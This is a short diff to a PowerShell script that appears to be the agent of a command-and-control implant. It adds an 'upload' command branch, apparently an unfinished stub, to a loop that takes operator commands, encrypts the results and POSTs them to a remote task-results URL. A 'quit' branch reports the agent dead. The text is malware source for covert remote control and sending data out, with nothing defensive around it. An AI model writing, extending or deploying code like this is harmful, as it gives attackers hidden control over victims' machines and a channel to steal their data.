@@ -183,6 +183,16 @@ for (;;){
                 $resultfl = ("$resultl" + "$taskId")
                 Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
             }
+            elseif ($command -eq "upload"){
+                # sintax upload filename.zip
+                # loop( GET, decrypt, compose ), unzip
+                $name    = $args[0]
+                $res = "VALID file downloaded to " + "$file_out"
+                $res  = Encrypt-String $key $res
+                $data    = @{result = "$res"}
+                $resultfl = ("$resultl" + "$taskId")
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+            }
             elseif ($command -eq "quit"){
                 $res = "VALID agent dead " + "$name"
                 $res  = Encrypt-String $key $res
